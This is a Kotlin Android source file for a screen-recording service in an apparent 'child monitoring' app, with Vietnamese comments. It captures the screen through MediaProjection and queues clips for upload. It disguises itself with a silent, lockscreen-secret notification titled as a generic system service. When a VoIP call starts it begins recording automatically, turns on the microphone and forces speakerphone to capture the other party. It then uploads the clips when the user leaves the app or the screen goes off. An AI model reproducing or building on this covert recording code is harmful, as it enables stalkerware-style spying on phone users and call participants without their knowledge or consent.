package com.example.childmonitoringapp.service

import android.app.*
import android.content.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.childmonitoringapp.upload.UploadWorker
import java.io.File
import android.media.AudioManager
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener

class MonitoringService : Service() {

    // ==== Cấu hình hành vi ====
    private val AUTO_START_ON_VOIP = true
    private val DELAY_BEFORE_RESTART_MS = 500L
    private val DELAY_BEFORE_START_MS   = 200L

    // Grace: mở thông báo (do Accessibility xử lý), tắt màn hình, rời app mục tiêu
    // - Rời app >5s: Accessibility gửi ACTION_STOP_FLUSH
    // - Tắt màn hình >5s: Service tự gửi ACTION_STOP_FLUSH
    private val SCREEN_GRACE_MS = 5_000L

    private val CHANNEL_ID = "MonitoringChannel"
    private val NOTIFICATION_ID = 1
    private val TAG = "MonitoringService"

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var recorderSurface: android.view.Surface? = null

    private var isRecording = false
    private val handler = android.os.Handler(android.os.Looper.getMainLooper())

    // ==== Trạng thái gọi / audio ====
    private var callActive = false
    private var inComm = false
    private var wantMic = false

    // ==== Upload/Phiên ====
    private var lastVideoFile: File? = null
    private var currentAppTag: String = "unknown"

    // Ở đầu file (thuộc MonitoringService)
    private val MAX_FILE_BYTES = 290L * 1024 * 1024 // ~290MB chừa biên tránh 300MB server
    private val SPLIT_RESTART_DELAY_MS = 200L
    private var isSplitting = false


    // Danh sách file trong phiên (pending đến khi kết thúc phiên)
    private data class PendingClip(
        val path: String,
        val app: String,        // non-null để khớp UploadWorker.enqueue(app: String)
        val note: String?,
        val createdAt: Long = System.currentTimeMillis()
    )
    private val pendingClips = mutableListOf<PendingClip>()

    // Prefs
    private val prefs by lazy { getSharedPreferences("mprefs", Context.MODE_PRIVATE) }

    // Poll audio mode để nhận biết VoIP
    private val audioPoll = object : Runnable {
        private var lastInComm = false
        override fun run() {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val now = (am.mode == AudioManager.MODE_IN_COMMUNICATION)
            if (now != inComm) {
                inComm = now
                Log.d(TAG, "Audio mode changed: inComm=$inComm")
                applyMicStateIfChanged("inComm=$inComm")

                if (AUTO_START_ON_VOIP && inComm && !isRecording && mediaProjection != null) {
                    wantMic = true
                    Log.d(TAG, "AUTO_START_ON_VOIP: scheduling start with MIC")
                    handler.postDelayed({
                        startScreenRecording()
                        updateNotification("Đang quay (VoIP)")
                    }, DELAY_BEFORE_RESTART_MS)
                }
            }
            lastInComm = now
            handler.postDelayed(this, 1000)
        }
    }

    // ==== SCREEN OFF/ON grace ====
    private var screenReceiver: BroadcastReceiver? = null
    private var screenOffAt: Long = 0L
    private val screenHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var screenGrace: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        Log.w(TAG, "onCreate()")

        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        // Telephony (SIM call)
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            tm.registerTelephonyCallback(
                mainExecutor,
                object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                    override fun onCallStateChanged(state: Int) {
                        when (state) {
                            TelephonyManager.CALL_STATE_OFFHOOK,
                            TelephonyManager.CALL_STATE_RINGING -> {
                                if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
                            }
                            TelephonyManager.CALL_STATE_IDLE -> {
                                if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
                            }
                        }
                    }
                }
            )
        } else {
            @Suppress("DEPRECATION")
            tm.listen(object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK,
                        TelephonyManager.CALL_STATE_RINGING -> {
                            if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE)
        }

        // Poll audio mode
        handler.post(audioPoll)

        // Đăng ký SCREEN_OFF/ON để áp grace 5s (tắt màn hình)
        val f = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_SCREEN_ON)
        }
        screenReceiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, intent: Intent?) {
                when (intent?.action) {
                    Intent.ACTION_SCREEN_OFF -> onScreenOff()
                    Intent.ACTION_SCREEN_ON  -> onScreenOn()
                }
            }
        }
        registerReceiver(screenReceiver, f)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.w(TAG, "onStartCommand(): act=${intent?.action}")
        val ACTION_INIT_AFTER_BOOT = "INIT_AFTER_BOOT"
        when (intent?.action) {
            ACTION_SET_PROJECTION -> {
                val rc = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
                val pd = intent.getParcelableExtra<Intent>("projectionData")
                if (rc == Activity.RESULT_OK && pd != null) {
                    mediaProjection = mediaProjectionManager.getMediaProjection(rc, pd)
                    mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                        override fun onStop() {
                            Log.w(TAG, "MediaProjection revoked by system")
                            if (isRecording) stopRecording()
                            mediaProjection = null
                        }
                    }, handler)
                    prefs.edit().putBoolean("hasProjection", true).apply()
                    Log.d(TAG, "MediaProjection READY")
                } else {
                    prefs.edit().putBoolean("hasProjection", false).apply()
                    Log.e(TAG, "SET_PROJECTION missing extras")
                }
            }

            ACTION_START_SCREEN -> {
                currentAppTag = intent.getStringExtra("appTag") ?: "unknown"
                if (mediaProjection == null) {
                    Log.e(TAG, "No MediaProjection")
                    return START_STICKY
                }
                if (!isRecording) {
                    startScreenRecording()
                    updateNotification("Đang quay màn hình ($currentAppTag)")
                }
            }

            ACTION_SPLIT_SCREEN -> {
                if (mediaProjection == null) return START_STICKY
                if (isRecording) {
                    stopRecording() // → chỉ thêm vào pending, KHÔNG upload
                    handler.postDelayed({ startScreenRecording() }, DELAY_BEFORE_START_MS)
                } else {
                    startScreenRecording()
                }
            }

            ACTION_STOP_SCREEN -> {
                // STOP thường (overlay ngắn, đổi nhanh) → KHÔNG flush
                if (isRecording) stopRecording()
                updateNotification("Đang chờ…")
            }

            ACTION_STOP_FLUSH -> {
                // Kết thúc phiên (rời mục tiêu >5s / màn hình tắt >5s) → FLUSH
                if (isRecording) stopRecording()
                flushPending("end-session")
                updateNotification("Đã dừng — đã đẩy clip")
            }
            ACTION_INIT_AFTER_BOOT -> {
                // chỉ đảm bảo các poll/receiver đã đăng ký; KHÔNG start quay
                updateNotification("Dịch vụ hệ thống")
                // không cần làm gì thêm: Accessibility sẽ tự chạy khi user vào app mục tiêu
            }
        }
        startForeground(NOTIFICATION_ID, createNotification())
        return START_STICKY
    }

    // ==== MIC theo trạng thái gọi ====
    private fun shouldMic(): Boolean = inComm && !callActive

    private fun applyMicStateIfChanged(reason: String) {
        val newWant = shouldMic()
        if (newWant == wantMic) return
        val oldWant = wantMic
        wantMic = newWant
        Log.d(TAG, "MIC state -> $wantMic (reason=$reason)")

        if (!isRecording) return

        if (!oldWant && newWant) {
            handler.postDelayed({
                stopRecording()
                handler.postDelayed({ startScreenRecording() }, DELAY_BEFORE_START_MS)
            }, DELAY_BEFORE_RESTART_MS)
        } else {
            // từ có mic -> không mic: giữ nguyên, lần split sau áp trạng thái
        }
    }

    fun align16(v: Int) = ((v + 15) / 16) * 16


    private fun startScreenRecording() {
        if (mediaProjection == null || isRecording) return

        val moviesDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)!!.apply { mkdirs() }
        val outFile = File(moviesDir, "screen_record_${System.currentTimeMillis()}.mp4")
        Log.d(TAG, "Saving to: ${outFile.absolutePath}")

        val dm = resources.displayMetrics
        val w0 = dm.widthPixels
        val h0 = dm.heightPixels
        val densityDpi = dm.densityDpi

        // === TÍNH SIZE "THÂN THIỆN" (≤720p chiều ngắn, ≤1440p chiều dài, MB/frame ≤ 8192) ===
        val baseShort = minOf(w0, h0)
        val baseLong  = maxOf(w0, h0)

        var targetShort = minOf(baseShort, 720) // giới hạn chiều ngắn tối đa 720
        var targetLong  = (targetShort.toLong() * baseLong / baseShort).toInt()
        if (targetLong > 1440) {                // giới hạn chiều dài tối đa 1440
            targetLong  = 1440
            targetShort = (targetLong.toLong() * baseShort / baseLong).toInt()
        }

        var width  = align16(if (w0 <= h0) targetShort else targetLong)
        var height = align16(if (w0 <= h0) targetLong  else targetShort)

        fun mbpf(w: Int, h: Int) = ((w + 15) / 16) * ((h + 15) / 16)
        while (mbpf(width, height) > 8192) { // phòng máy "dị" vẫn vượt ngưỡng
            targetShort = (targetShort * 9) / 10
            targetLong  = (targetLong  * 9) / 10
            width  = align16(if (w0 <= h0) targetShort else targetLong)
            height = align16(if (w0 <= h0) targetLong  else targetShort)
        }

        val includeAudioInitial = wantMic

        fun startOnce(includeAudioTry: Boolean): Boolean {
            val mr = MediaRecorder()
            mediaRecorder = mr
            try {
                if (includeAudioTry) mr.setAudioSource(MediaRecorder.AudioSource.MIC)
                mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)

                if (includeAudioTry) {
                    mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    mr.setAudioEncodingBitRate(128_000)
                    mr.setAudioSamplingRate(44100)
                    mr.setAudioChannels(1)
                    if (inComm) enableSpeakerForCall()
                }

                // === ENCODER VIDEO "DỄ GIẢI MÃ" ===
                mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                mr.setVideoSize(width, height)
                mr.setVideoFrameRate(20)
                mr.setVideoEncodingBitRate(2_000_000) // hạ còn ~2.0 Mb/s cho MIUI ổn định hơn
                runCatching {
                    // Nhiều máy hỗ trợ API ẩn này → keyframe mỗi ~1s giúp decoder dễ sync
                    val m = MediaRecorder::class.java.getMethod("setVideoEncodingIFrameInterval", Int::class.java)
                    m.invoke(mr, 1)
                }

                // Tự split khi gần 300MB (đặt ~290MB để an toàn với server 300MB)
                runCatching { mr.setMaxFileSize(MAX_FILE_BYTES) } // đảm bảo đã có hằng số này

                mr.setOutputFile(outFile.absolutePath)

                mr.setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                        Log.w(TAG, "Max file size reached -> split")
                        runCatching { stopRecording() } // đóng file hiện tại (sẽ đưa vào hàng đợi upload)
                        handler.postDelayed({ startScreenRecording() }, DELAY_BEFORE_START_MS) // tạo file mới quay tiếp
                    }
                }

                mr.setOnErrorListener { _, what, extra ->
                    Log.e(TAG, "VIDEO MR_ERROR what=$what extra=$extra")
                    runCatching { stopRecording() }
                }

                mr.prepare()

                recorderSurface = mr.surface
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    recorderSurface, null, null
                ) ?: throw IllegalStateException("VirtualDisplay null")

                lastVideoFile = outFile
                mr.start()
                isRecording = true
                Log.d(TAG, "Screen recording started (${width}x$height @20fps, audio=$includeAudioTry)")
                return true
            } catch (e: Exception) {
                Log.e(TAG, "Start rec failed (audio=$includeAudioTry): ${e.message}", e)
                try { mr.reset(); mr.release() } catch (_: Throwable) {}
                mediaRecorder = null
                try { recorderSurface?.release() } catch (_: Throwable) {}
                recorderSurface = null
                try { virtualDisplay?.release() } catch (_: Throwable) {}
                virtualDisplay = null
                runCatching { if (outFile.length() == 0L) outFile.delete() }
                return false
            }
        }

        if (!startOnce(includeAudioInitial) && includeAudioInitial) {
            Log.w(TAG, "Retry without audio due to failure")
            wantMic = false
            startOnce(false)
        }
    }



    private fun stopRecording() {
        mediaRecorder?.let {
            try { it.stop(); it.reset() } catch (_: Exception) {}
            it.release()
        }
        mediaRecorder = null
        virtualDisplay?.release(); virtualDisplay = null
        recorderSurface?.release(); recorderSurface = null
        isRecording = false
        restoreAudioRoute()
        Log.d(TAG, "Screen recording stopped & resources released")

        // Thêm vào danh sách phiên (pending) — KHÔNG upload ngay
        val f = lastVideoFile
        lastVideoFile = null
        if (f != null && f.exists() && f.length() > 0) {
            pendingClips += PendingClip(
                path = f.absolutePath,
                app  = currentAppTag,
                note = null
            )
            Log.d(TAG, "Queued PENDING: ${f.name} (pending=${pendingClips.size})")
        }
    }

    // ==== FLUSH khi kết thúc phiên ====
    private fun flushPending(reason: String) {
        if (pendingClips.isEmpty()) {
            Log.d(TAG, "flushPending: nothing to flush ($reason)")
            return
        }
        Log.d(TAG, "flushPending($reason): ${pendingClips.size} clips")
        for (pc in pendingClips) {
            UploadWorker.enqueue( // đảm bảo enqueueUniqueWork(APPEND) ở trong UploadWorker
                context = this,
                path = pc.path,
                app = pc.app,
                note = pc.note,
                durationSec = null
            )
        }
        pendingClips.clear()
    }

    // ==== SCREEN OFF/ON (grace) ====
    private fun onScreenOff() {
        screenOffAt = android.os.SystemClock.uptimeMillis()
        screenGrace?.let { screenHandler.removeCallbacks(it) }
        screenGrace = Runnable {
            // Nếu vẫn chưa bật lại sau 5s → coi như rời hẳn phiên: flush pending
            val it = Intent(this, MonitoringService::class.java).apply {
                action = ACTION_STOP_FLUSH
            }
            androidx.core.content.ContextCompat.startForegroundService(this, it)
            Log.d(TAG, "SCREEN_OFF exceeded grace → STOP_FLUSH")
        }
        screenHandler.postDelayed(screenGrace!!, SCREEN_GRACE_MS)
        Log.d(TAG, "SCREEN_OFF → start ${SCREEN_GRACE_MS}ms grace")
    }

    private fun onScreenOn() {
        screenGrace?.let { screenHandler.removeCallbacks(it) }
        screenGrace = null
        val since = android.os.SystemClock.uptimeMillis() - screenOffAt
        Log.d(TAG, "SCREEN_ON after ${since}ms → cancel screen grace")
    }

    // ==== Notification ====
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW
            ).apply { lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_more)
            .setContentTitle("Dịch vụ hệ thống")
            .setContentText("Ứng dụng hệ thống")
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_more)
            .setOngoing(true)
            .setSilent(true)
            .setContentTitle("Dịch vụ đang chạy")
            .setContentText(text)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        nm.notify(NOTIFICATION_ID, n)
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(audioPoll)
        screenGrace?.let { screenHandler.removeCallbacks(it) }
        runCatching { unregisterReceiver(screenReceiver) }
        stopRecording()
        mediaProjection?.stop()
        mediaProjection = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        const val ACTION_SET_PROJECTION = "SET_PROJECTION"
        const val ACTION_START_SCREEN   = "START_SCREEN"
        const val ACTION_STOP_SCREEN    = "STOP_SCREEN"     // stop (pending) — KHÔNG flush
        const val ACTION_STOP_FLUSH     = "STOP_FLUSH"      // stop & FLUSH pending (kết thúc phiên)
        const val ACTION_SPLIT_SCREEN   = "SPLIT_SCREEN"    // split (pending)
    }

    // ==== Điều khiển route âm thanh ====
    private var savedMode: Int? = null
    private var savedSpeaker: Boolean? = null

    private fun enableSpeakerForCall() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if (savedMode == null) savedMode = am.mode
        if (savedSpeaker == null) savedSpeaker = am.isSpeakerphoneOn

        am.mode = AudioManager.MODE_IN_COMMUNICATION
        am.isSpeakerphoneOn = true
        try { Thread.sleep(300) } catch (_: InterruptedException) {}
    }

    private fun restoreAudioRoute() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        savedSpeaker?.let { am.isSpeakerphoneOn = it }
        savedMode?.let { am.mode = it }
        savedSpeaker = null
        savedMode = null
    }
}
